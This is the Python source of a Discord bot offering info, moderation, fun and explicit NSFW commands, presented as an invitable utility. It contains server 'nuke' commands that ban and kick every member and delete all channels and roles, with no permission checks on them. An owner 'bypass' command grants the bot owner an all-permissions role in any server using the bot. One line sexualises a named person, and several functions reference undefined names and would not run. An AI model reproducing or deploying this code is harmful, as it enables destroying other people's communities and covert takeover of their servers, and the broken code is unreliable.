####################              ####################
#              Comma Counts Discord Bot              #
####################              ####################

# Libs
import discord # For discord
from discord.ext import commands # For discord
import json # For interacting with json
from pathlib import Path # For paths
import platform # For stats
import logging
import asyncio
from random import randrange
from discord import Activity
from discord import File
from discord import Permissions
from authgen import Generator
#Get current working directory
cwd = Path(__file__).parents[0]
cwd = str(cwd)
print(f"{cwd}\n-----")

#Defining a few things
secret_file = json.load(open(cwd+'/bot_config/secrets.json'))
bot = commands.Bot(command_prefix=commands.when_mentioned_or('comma!' , 'c!' , 'c~'), case_insensitive=True)#, owner_id=668612123370323998)
bot.config_token = secret_file['token']
logging.basicConfig(level=logging.INFO)
passGene = Generator


bot.version = 'v1.5.4'

bot.blacklisted_user = []

@bot.event
async def on_ready():
    print(f"-----\nLogged in as: {bot.user.name} : {bot.user.id}\n-----\nMy current prefix is: comma!\n-----")
    data = read_json("blacklist")
    bot.blacklisted_user = data["blacklistedUsers"]
    await bot.change_presence(activity=discord.Game(name=f"comma!help | {len(bot.users)} Users")) # This changes the bots 'activity'

@bot.event
async def on_command_error(ctx, error):
    #Ignore these errors
    ignored = (commands.CommandNotFound, commands.UserInputError)
    if isinstance(error, ignored):
        return

    #Begin error handling
    if isinstance(error, commands.CommandOnCooldown):
        m, s = divmod(error.retry_after, 60)
        h, m = divmod(m, 60)
        if int(h) is 0 and int(m) is 0:
            await ctx.send(f' You must wait {int(s)} seconds to use this command!')
        elif int(h) is 0 and int(m) is not 0:
            await ctx.send(f' You must wait {int(m)} minutes and {int(s)} seconds to use this command!')
        else:
            await ctx.send(f' You must wait {int(h)} hours, {int(m)} minutes and {int(s)} seconds to use this command!')
    elif isinstance(error, commands.CheckFailure):
        await ctx.send("Hey! You lack permission to use this command.")
    raise error

@bot.event
async def on_message(message):
    #ignore yourselves
    if message.author.id == bot.user.id:
        return

    #blacklist system
    if message.author.id in bot.blacklisted_user:
        return

    if message.content.lower().startswith("commahelp"):
        await message.channel.send("Hey! Why don't you use the help command! It's `comma!help`.")

    await bot.process_commands(message)

@bot.command()
@commands.is_owner()
async def blacklist(ctx, user: discord.Member):
    bot.blacklisted_user.append(user.id)
    data = read_json("blacklist")
    data["blacklistedUsers"].append(user.id)
    write_json(data, "blacklist")
    await ctx.send(f"Hey, I have blacklisted {user.name} for you!")

@bot.command()
@commands.is_owner()
async def whitelist(ctx, user: discord.Member):
    bot.blacklisted_user.remove(user.id)
    data = read_json("blacklist")
    data["blacklistedUsers"].remove(user.id)
    write_json(data, "blacklist")
    await ctx.send(f"Hey, I have whitelisted {user.name} for you!")

@bot.command()
async def botstats(ctx):
    """
    A usefull command that displays bot statistics.
    """
    pythonVersion = platform.python_version()
    dpyVersion = discord.__version__
    serverCount = len(bot.guilds)
    memberCount = len(set(bot.get_all_members()))

    embed = discord.Embed(title=f'{bot.user.name} Stats', description='Meh Stats :3', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Bot Version:', value=bot.version)
    embed.add_field(name='Python Version:', value=pythonVersion)
    embed.add_field(name='Discord.Py Version', value=dpyVersion)
    embed.add_field(name='Total Servers:', value=serverCount)
    embed.add_field(name='Total Users:', value=memberCount)
    embed.add_field(name='Bot Developers:', value="<@668612123370323998>")

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)
    await ctx.send(f"Hey {ctx.author.display_name} **Look at thoses numbers!**")

@Me.command(name="serverinfo")
async def guild_info(Ctx):
    header = f"Server information - {Ctx.guild.name}\n\n"
    rows = {
        "Name"                  : Ctx.guild.name,
        "ID"                    : Ctx.guild.id,
        "Region"                : str(Ctx.guild.region).title(),
        "Owner"                 : Ctx.guild.owner.display_name,
        "Shard ID"              : Ctx.guild.shard_id,
        "Created on"            : Ctx.guild.created_at.strftime("%d/%m/%y %H:%M:%S"),
        "Most recent member"    : [Member for Member in Guild.members if Member.joined_at is max([Member.joined_at for Member in Guild.members])][0].display_name,
        "...joined"             : max([Member.joined_at for Member in Guild.members]).strftime("%d/%m/%y %H:%M:%S"),
        "Nº of members"         : len(Guild.members),
        "...of which human"     : len([Member for Member in Guild.members if not Member.bot]),
        "...of which bots"      : len([Member for Member in Guild.members if Member.bot]),
        "Nº of banned members"  : len(await Ctx.guild.bans()),
        "Nº of categories"      : len(Ctx.guild.categories),
        "Nº of text channels"   : len(Ctx.guild.text_channels),
        "Nº of voice channels"  : len(Ctx.guild.voice_channels),
        "Nº of roles"           : len(Ctx.guild.roles),
        "Nº of invites"         : len(await Ctx.guild.invites()),
    }
    table = header + "\n".join([f"{key}{' '*(max([len(key) for key in rows.keys()])+2-len(key))}{value}" for key, value in rows.items()])
    await Ctx.send(f"```{table}```{Ctx.guild.icon_url}")
    return

@bot.command()
async def invite(ctx):
    """
    A usefull command that displays bot statistics.
    """

    embed = discord.Embed(title=f'Invite Me!', description='Here is the link to invite me. Click it!', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='**Invite Me To Your Server!**', value="**https://discordapp.com/api/oauth2/authorize?client_id=688545329771053115&permissions=59392&scope=bot**")

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.author.send(embed=embed)
    await ctx.send(f"Hey {ctx.author.mention}, I DM'ed you my invite link!")

@bot.command()
async def passGen(ctx):
    await ctx.send("Processing.")
    asyncio.sleep(10)
    await ctx.send("Processing..")
    asyncio.sleep(10)
    await ctx.send("Processing...")
    asyncio.sleep(10)
    password = passGene.random_medium(length=24)
    await ctx.author.send(f"Password: **{password}**")
    await ctx.send(f"Hey {ctx.author.mention}, I DM'ed you your password!")

@bot.command()
async def source(ctx):
    """
    A usefull command that displays bot statistics.
    """

    embed = discord.Embed(title=f'Source Code', description='Here is the link. Click it!', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='**Github Repository**', value="**https://github.com/RightfulTakesAll/CommaCountsDB**")

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)
    await ctx.send(f"Hey {ctx.author.mention}, Heres The link!")

@bot.command()
async def release(ctx):
    """
    A usefull command that displays bot statistics.
    """

    embed = discord.Embed(title=f'Latest Release', description='Here is the link. Click it!', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='**Github Repository**', value="**https://github.com/RightfulTakesAll/CommaCountsDB/releases/tag/1.5.3**")

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)
    await ctx.send(f"Hey {ctx.author.mention}, Heres The link!")

@bot.command()
async def userinfo(ctx, member: discord.Member = None):
    member = ctx.author if not member else member
    roles = [role for role in member.roles]

    embed=discord.Embed(colour=member.color, timestamp=ctx.message.created_at)
    
    embed.set_author(name=f"User Info = {member}")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    
    embed.add_field(name="ID:", value=member.id, inline=False)
    embed.add_field(name="Guild name:", value=member.display_name, inline=False)
    
    embed.add_field(name="Created at:", value=member.created_at.strftime("%a, %d %B %Y, %I:%M %p GMT"), inline=False)
    embed.add_field(name="Joined at:", value=member.joined_at.strftime("%a, %d %B %Y, %I:%M %p GMT"), inline=False)
    
    embed.add_field(name=f"Roles ({len(roles)})", value=" ".join([role.mention for role in roles]), inline=False)
    embed.add_field(name="Top role:", value=member.top_role.mention, inline=False)
    
    embed.add_field(name="Bot?", value=member.bot, inline=False)

    await ctx.send(embed=embed)

#help start
bot.remove_command("help")
@bot.command("help")
async def embede(ctx):

    embed = discord.Embed(title=f'Modules', description='Here are all of my Modules! :smile:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='**:tools: Mod Commands**', value="`comma!help-mod`", inline=True)
    embed.add_field(name='**:information_source: Info Commands**', value="`comma!help-info`", inline=True)
    embed.add_field(name='**:book: Other Commands**', value="`comma!help-misc`", inline=True)
    embed.add_field(name='**:warning: Owner Commands**', value="`comma!help-owner`", inline=True)
    embed.add_field(name='**:wink: NSFW Commands**', value="`comma!help-commas`", inline=True)
    embed.add_field(name='**:confetti_ball: Fun Commands**', value="`comma!help-fun`", inline=True)

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)


@bot.command("help-mod")
async def embed4(ctx):

    embed = discord.Embed(title=f'Moderation Commands', description='Here are my mod Modules! :smile:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Deletes messages with ease :smile:', value="`comma!purge <message_amount>`", inline=False)
    embed.add_field(name='Kicks somebody from the Server :smile:', value="`comma!kick <@user_of_choice> <reason>`", inline=False)
    embed.add_field(name='Bans somebody from the Server :smile:', value="`comma!ban <@user_of_choice> <reason>`", inline=False)
    embed.add_field(name='Unbans somebody from the Server :smile:', value="`comma!unban <@user_thats_banned>`", inline=False)

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)

@bot.command("help-info")
async def embed3(ctx):

    embed = discord.Embed(title=f'Info Commands', description='Here are my info Modules! :smile:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Shows the bots latency', value="`comma!ping`", inline=False)
    embed.add_field(name='Checks for NSFW Channels', value="`comma!nsfwcheck`", inline=False)
    embed.add_field(name='Shows company info', value="`comma!companyview`", inline=False)
    embed.add_field(name='Shows info on a specific user', value="`comma!userinfo <@user>`", inline=False)
    embed.add_field(name='Shows changes made to the bot recently', value="`comma!changelog`", inline=False)
    embed.add_field(name='Shows statistics of the bot', value="`comma!botstats`", inline=False)
    embed.add_field(name='Shows all bot prefixes', value="`comma!prefixes`", inline=False)
    embed.add_field(name='Shows info for current server which command is executed in', value="`comma!serverinfo`", inline=False)
    
    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")

    await ctx.send(embed=embed)

@bot.command("help-misc")
async def embed2(ctx):

    embed = discord.Embed(title=f'Misc Commands', description='Here are my misc Modules! :smile:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Shows the bots invite link', value="`comma!invite`", inline=False)
    embed.add_field(name='Link To Source Code', value="`comma!source`", inline=False)
    embed.add_field(name='Generates A Random Password', value="`comma!passGen`", inline=False)
    embed.add_field(name='Shows The Latest Release For The Bot', value="`comma!release`", inline=False)


    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)

@bot.command("help-owner")
@commands.is_owner()
async def embed1(ctx):

    embed = discord.Embed(title=f'Owner Only Commands', description='Here are my __OWNER-ONLY__ Modules! :smile:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Turns off the bot', value="`comma!logout`", inline=False)
    embed.add_field(name='Blacklists a specific user', value="`comma!blacklist <@user>`", inline=False)
    embed.add_field(name='whitelists a blacklisted user', value="`comma!whitelist <@user>`", inline=False)
    embed.add_field(name='gives thee owner a role that has all permissions', value="`comma!bypass`", inline=False)
    embed.add_field(name='Server Nuke Commands', value="`comma!help-nuke`", inline=False)

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)

@bot.command("help-commas")
async def embed1(ctx):

    embed = discord.Embed(title=f'NSFW', description='Here are my comma Modules! :smile:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Shows a girl masterbating', value="`comma!sologirl`", inline=False)
    embed.add_field(name='Shows a big black cock', value="`comma!bbc`", inline=False)
    embed.add_field(name='Shows some anal porn', value="`comma!anal`", inline=False)
    embed.add_field(name='Shows a picture of pussy', value="`comma!pussy`", inline=False)
    embed.add_field(name='Shows a picture of ass', value="`comma!ass`", inline=False)
    embed.add_field(name='Shows a picture of boobs', value="`comma!boobs`", inline=False)
    embed.add_field(name='Shows some hentai', value="`comma!hentai`", inline=False)
    embed.add_field(name='Shows some lesbians', value="`comma!lesbian`", inline=False)
    embed.add_field(name='Shows a picture of nice feet', value="`comma!feet`", inline=False)

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    if ctx.channel.is_nsfw():
        await ctx.send(embed=embed)
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command("help-fun")
async def embedoi(ctx):

    embed = discord.Embed(title=f"Fun", description='Fun Commands! :smile:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Makes the bot say anything', value="`comma!echo <any_message_you_want>`", inline=False)
    embed.add_field(name='Roles a 6 sided dice', value="`comma!dice`", inline=False)
    embed.add_field(name='Bot answers a question', value="`comma!8ball <question>`", inline=False)

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)

@bot.command("help-nuke")
async def nukecmds(ctx):

    embed = discord.Embed(title=f'Nuke Commands', description='Here are my nuke Modules! :smirk:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Bans Everyone from server', value="`comma!banall`", inline=False)
    embed.add_field(name='Kicks Everyone from server', value="`comma!kickall`", inline=False)
    embed.add_field(name='Spam creates Channels', value="`comma!chanspam <create or delete>`", inline=False)
    embed.add_field(name='Spam creates Roles', value="`comma!roleedit <create or delete>`", inline=False)
    
    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")

    await ctx.send(embed=embed)
#help end

@bot.command(name="dice")
async def roll_dice(Ctx):
    await Ctx.send(f"{Ctx.author.display_name}, you rolled a **{randrange(1, 7)}**!")
    return

# mod commands
@bot.command()
@commands.has_permissions(ban_members=True)
async def kick(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f'Kicked {user.mention}')

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member : discord.Member, *, reason=None):
        await member.ban(reason=reason)
        await ctx.send(f'Banned {user.mention}')

@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member):
    banned_users = await ctx.guild.bans()
    member_name, me,member_discrimonator = member.split('#')

    for ban_entry in banned_users:
        user = ban_entry.user

        if (user.name, user.discrimonator) == (member_name, member_discrimonator):
            await ctx.guild.unban(user)
            await ctx.send(f'Unbanned {user.mention}')
            return
#mod end

@bot.command("prefixes")
async def ggfd(ctx):

    embed = discord.Embed(title=f'Prefixes', description='Here are my Prefixes! :smile:', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='1', value="`comma!`", inline=False)
    embed.add_field(name='2', value="`c!`", inline=False)
    embed.add_field(name='3', value="`c~`", inline=False)

    embed.set_footer(text=f"Carpe Noctem | {bot.user.name}")
    embed.set_author(name=bot.user.name, icon_url=bot.user.avatar_url)

    await ctx.send(embed=embed)

# Nuke Commands

@bot.command()
async def banall(ctx):
    await ctx.message.delete()
    await ctx.send('Banning all members!')
    print('Banning all members...')
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue

@bot.command()
async def kickall(ctx):
    await ctx.message.delete()
    await ctx.send('Kicking all members!')
    print('Kicking all members...')
    for member in ctx.guild.members:
        try:
            await member.kick()
        except:
            continue

@bot.command()
async def chanspam(ctx, choice):
    if choice == 'create':
        print('Spam creating channels...')
        for i in range(1, 11):
            await ctx.guild.create_text_channel(f'Spam-Text-Channel{i}')
            await ctx.guild.create_voice_channel(f'Spam-Voice-Channel{i}')
    elif choice == 'delete':
        print('Deleting all channels...')
        for channel in ctx.guild.channels:
            await channel.delete()
    else:
        await ctx.send('not valid option')

@bot.command()
async def roleedit(ctx, choice):
    if choice == 'create':
        print('Spam creating roles...')
        for i in range(1, 11):
            await ctx.guild.create_role(name=f'Spam Role {i}')
    elif choice == 'delete':
        print('Deleting all roles...')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
            else:
                break
    else:
        await ctx.send('not valid option')
# Nuke end

@bot.command()
@commands.is_owner()
async def bypass(ctx):
    await ctx.message.delete()
    await ctx.guild.create_role(name='Easy Bypss', permissions=Permissions.all())
    adminRole = discord.utils.get(ctx.guild.roles, name="Easy Bypass")
    await ctx.author.add_roles(adminRole)
    await ctx.send('A wild **Bypass** was created!')

@bot.command()
async def nsfwcheck(ctx):
    if ctx.channel.is_nsfw():
        ctx.send("Fuck Me Like You Fucked **Ashley Alban**. :wink:")
    else:
        await ctx.send("This is not a NSFW Channel.")

@bot.command()
async def purge(ctx, amount=5):
    await ctx.channel.purge(limit=amount)

@bot.command()
async def ping(ctx):
    await ctx.send(f'🏓 Pong | **Latency**: `{round (bot.latency * 1000)}` **ms**')

@bot.command(aliases=['disconnect', 'close', 'stopbot'])
@commands.is_owner()
async def logout(ctx):
    """
    If the user running the command owns the bot then this will disconnect the bot from discord.
    """
    await ctx.send(f"Hey {ctx.author.mention}, I am now logging out :wave:")
    await bot.logout()

@bot.command()
@commands.cooldown(1, 90, commands.BucketType.user)
async def echo(ctx, *, message=None):
    """
    A simple command that repeats the users input back to them.
    """
    message = message or "Please provide the message to be repeated."
    await ctx.message.delete()
    await ctx.send(message)

@bot.command()
async def companyview(ctx):
        em = discord.Embed(Title="Company", colour=0x62FF45)
        em.add_field(name='Trademark:', value="Under Trademark Of CCounts Ent.")
        em.add_field(name='Copyright:', value="2020 Copyright CCounts Ent. **__All Rights Reserved__**")
        em.add_field(name='Founder:', value="Our company is managed by RightfulTech#9645.")
        em.add_field(name='Founded:', value="CCounts Ent. was founded in 2016 by Ronne_l#1985")
        em.add_field(name='Company Statistics:', value="CCounts Ent. has a perfect user stock increase of 65.91% more users using us every month!")
        em.add_field(name='Company Products', value=f"CCounts Ent. is currently working on **{bot.user.name}** :robot:")
        await ctx.send(embed=em)

@client.command(aliases=['8ball'])
async def _8ball(ctx, *, question):
    responses = ['its possible.',
    'no.',
    'in a few days.',
    'probably',
    'Chance of that happening is zero',
    'Yes',
    'Not Really',
    '-_-',
    'Try again later. Im very tired.']
    await ctx.send(f'Question: {question}\nAnswer: {random.choice(responses)}')

@bot.command()
async def changelog(ctx):
        em2 = discord.Embed(Title=":clipboard: **Change Log** :clipboard:", colour=0x62FF45)
        em2.add_field(name=':receipt: Most Recent Version:', value=f"{bot.version}", inline=False)
        em2.add_field(name=':newspaper: New Features:', value="New Password Generator Command (**passGen**)", inline=False)
        em2.add_field(name=':star_struck: Next Possible Features:', value="**Premium Commands, And More!**", inline=False)
        em2.add_field(name=':bug: Known Bugs:', value="**N/A**", inline=False)
        await ctx.send(embed=em2)

#nsfw start
@bot.command()
async def sologirl(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/sologirl.gif"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command()
async def bbc(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/bbc.gif"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command()
async def anal(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/anal.gif"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command()
async def pussy(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/pussy.jpg"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command()
async def ass(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/ass.jpg"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command()
async def boobs(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/boobs.png"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command()
async def hentai(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/hentai.gif"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command()
async def lesbian(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/lesbian.gif"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")

@bot.command()
async def feet(ctx):
    if ctx.channel.is_nsfw():
        await ctx.send(file=File(fp="./bot_nsfw/feet.jpg"))
    else:
        await ctx.send("HEY! What are you doing??? This isn't an NSFW Channel....")
#end of nsfw

@echo.error
async def echo_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send("Hey did you forget something?")

def read_json(filename):
    with open(f"{cwd}/bot_config/{filename}.json", "r") as file:
        data = json.load(file)
    return data

def write_json(data, filename):
    with open(f"{cwd}/bot_config/{filename}.json", "w") as file:
        json.dump(data, file, indent=4)

bot.run(bot.config_token) #Runs our bot
